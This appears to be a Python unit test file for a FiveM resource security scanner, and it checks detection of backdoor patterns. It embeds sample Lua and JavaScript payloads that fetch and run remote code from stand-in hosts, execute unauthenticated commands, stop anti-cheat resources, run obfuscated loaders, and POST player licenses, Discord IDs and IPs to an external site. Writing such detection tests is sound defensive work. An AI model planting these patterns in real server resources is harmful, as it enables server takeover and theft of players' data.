"""
tests/test_advanced_backdoors.py
Advanced multi-indicator correlation tests for the FiveM security engine.
Validates HTTP dynamic downloads, unauthenticated command execution, identifier exfiltration,
resource stopping, JS remote loaders, and obfuscation.
"""

import os
import unittest
import tempfile
from typing import List

from core.scanner import _analyze_file
from core.file_discovery import FiveMFile, FiveMResource
from core.risk_scorer import DetectionResult

# ─── Multi-Indicator Code Payload Synthetics ─────────────────────────────────

# 1. HTTP request + downloaded content + decoding + dynamic execution
COMBO_1_HTTP_LOAD = """
PerformHttpRequest("https://suspicious-domain.com/payload.txt", function(statusCode, responseText, headers)
    if statusCode == 200 then
        local decodedCode = json.decode(responseText)
        local loaded = loadstring(decodedCode.lua)
        if loaded then
            loaded()
        end
    end
end)
"""

# 2. Network event + untrusted player input + dangerous server command + missing authorization
COMBO_2_EVENT_EXEC = """
RegisterNetEvent("admin:executeCommand")
AddEventHandler("admin:executeCommand", function(playerInput)
    -- Dangerous execution of command with player parameters, zero ACE permission checks
    ExecuteCommand(playerInput)
end)
"""

# 3. Player identifier collection + external HTTP request + transmission of the identifier
COMBO_3_EXFIL = """
RegisterNetEvent("playerConnecting")
AddEventHandler("playerConnecting", function(name, setKickReason, deferrals)
    local source = source
    local license = GetPlayerIdentifier(source, 0)
    local discord = GetPlayerIdentifier(source, 1)
    local ip = GetPlayerEndpoint(source)

    local payload = json.encode({
        name = name,
        license = license,
        discord = discord,
        ip = ip
    })

    PerformHttpRequest("https://external-leak-site.com/api/leak", function(code, text)
        print("Logged")
    end, "POST", payload)
end)
"""

# 4. Resource StopResource/RestartResource + security-related resource name
COMBO_4_STOP = """
local securityRes = "easyadmin"
StopResource(securityRes)
StopResource("shield-anticheat")
"""

# 5. JavaScript fetch/http request + downloaded content + eval/dynamic execution
COMBO_5_JS_LOAD = """
fetch('https://malicious-nui-assets.com/payload.js')
  .then(response => response.text())
  .then(code => {
      eval(code); // Remote NUI code execution
  });
"""

# 6. Obfuscated Lua/JavaScript containing multiple suspicious indicators
COMBO_6_OBFUSCATED = """
local _char = string.char
local payload = _char(108,111,97,100,115,116,114,105,110,103,40,34,112,114,105,110,116,40,39,104,97,99,107,101,100,39,41,34,41)
assert(load(payload))()
"""


class TestAdvancedBackdoors(unittest.TestCase):

    def setUp(self) -> None:
        self.temp_root = tempfile.TemporaryDirectory()
        self.cfg = {
            "scan": {
                "enable_obfuscation_check": True
            }
        }
        self.res = FiveMResource(name="advanced_resource", path=self.temp_root.name)

    def tearDown(self) -> None:
        self.temp_root.cleanup()

    def _analyze_code(self, code: str, ext: str) -> List[DetectionResult]:
        file_path = os.path.join(self.temp_root.name, f"test_file{ext}")
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(code)

        f_obj = FiveMFile(
            absolute_path=file_path,
            relative_path=f"test_file{ext}",
            filename=f"test_file{ext}",
            extension=ext,
            size_bytes=len(code),
            file_type="lua" if ext == ".lua" else "js"
        )
        return _analyze_file(f_obj, self.res, self.cfg)

    def test_http_dynamic_download_combination(self) -> None:
        detections = self._analyze_code(COMBO_1_HTTP_LOAD, ".lua")
        self.assertTrue(len(detections) > 0)
        
        # Verify Critical classification
        crit = [d for d in detections if d.severity == "CRITICAL"]
        self.assertTrue(len(crit) > 0, "Combination of HTTP request and dynamic loadstring must be CRITICAL")
        self.assertTrue(crit[0].confidence >= 90)

    def test_unauthenticated_command_execution(self) -> None:
        detections = self._analyze_code(COMBO_2_EVENT_EXEC, ".lua")
        self.assertTrue(len(detections) > 0)
        
        # Verify high/critical rating for executing raw command parameter inputs
        high_critical = [d for d in detections if d.severity in ["HIGH", "CRITICAL"]]
        self.assertTrue(len(high_critical) > 0)

    def test_identifier_exfiltration(self) -> None:
        detections = self._analyze_code(COMBO_3_EXFIL, ".lua")
        self.assertTrue(len(detections) > 0)
        
        # Should flag exfiltration of sensitive player tokens to external URLs
        leak_det = [d for d in detections if "FIVEM-BACK-010" in d.rule_id or d.severity in ["HIGH", "CRITICAL"]]
        self.assertTrue(len(leak_det) > 0)

    def test_security_resource_stopping(self) -> None:
        detections = self._analyze_code(COMBO_4_STOP, ".lua")
        self.assertTrue(len(detections) > 0)
        
        stop_det = [d for d in detections if "FIVEM-SUSP-008" in d.rule_id or d.severity in ["MEDIUM", "HIGH"]]
        self.assertTrue(len(stop_det) > 0)

    def test_javascript_dynamic_loader(self) -> None:
        detections = self._analyze_code(COMBO_5_JS_LOAD, ".js")
        self.assertTrue(len(detections) > 0)
        
        js_det = [d for d in detections if "JS-SUSP" in d.rule_id or d.severity in ["HIGH", "CRITICAL"]]
        self.assertTrue(len(js_det) > 0)

    def test_obfuscation_payload(self) -> None:
        detections = self._analyze_code(COMBO_6_OBFUSCATED, ".lua")
        self.assertTrue(len(detections) > 0)
        
        obf_det = [d for d in detections if "LUA-OBF" in d.rule_id or d.severity in ["HIGH", "CRITICAL"]]
        self.assertTrue(len(obf_det) > 0)


if __name__ == "__main__":
    unittest.main()
